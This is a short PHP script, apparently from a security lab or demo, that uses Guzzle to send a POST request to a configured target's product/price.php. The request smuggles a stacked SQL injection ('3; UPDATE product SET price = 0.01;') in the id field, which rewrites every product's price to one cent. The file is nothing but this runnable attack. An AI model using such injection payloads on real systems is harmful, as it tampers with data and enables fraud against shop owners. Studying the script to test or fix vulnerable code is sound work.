<?php

require_once __DIR__ . '/../../vendor/autoload.php';

$config = require_once __DIR__ . '/../../config/config.php';

$client = new \GuzzleHttp\Client;

$response = $client->request(
    'POST',
    $config['target'] . 'product/price.php',
    [
        'form_params' => [
            'id' => "3; UPDATE product SET price = 0.01;",
        ]
    ]
);

echo $response->getBody();

